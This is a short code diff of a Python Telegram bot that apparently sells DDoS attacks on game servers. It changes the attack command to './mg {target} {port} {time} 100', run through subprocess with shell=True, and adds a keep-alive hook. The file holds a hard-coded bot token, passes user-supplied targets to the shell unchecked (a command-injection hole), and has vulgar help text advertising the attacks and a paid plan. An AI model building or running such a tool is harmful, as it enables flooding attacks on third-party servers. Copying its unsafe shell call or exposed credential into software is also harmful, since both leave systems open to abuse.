@@ -3,6 +3,9 @@ import subprocess
 import datetime
 import os
 
+from keep_alive import keep_alive
+keep_alive()
+
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7817888758:AAEPZFAEtc-zlp4FOb4VDwwzt5k-faKzTHQ')
 
@@ -300,7 +303,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./ranbal {target} {port} {time}"
+                    full_command = f"./mg {target} {port} {time} 100"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
@@ -342,7 +345,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''
-💥 /chodo : 😫BGMI WALO KI MAA KO CHODO🥵. 
+💥 /chodo : 😫FF WALO KI MAA KO CHODO🥵. 
 💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
 💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
 💥 /plan : 💵SABKE BSS KA BAT HAI💵.
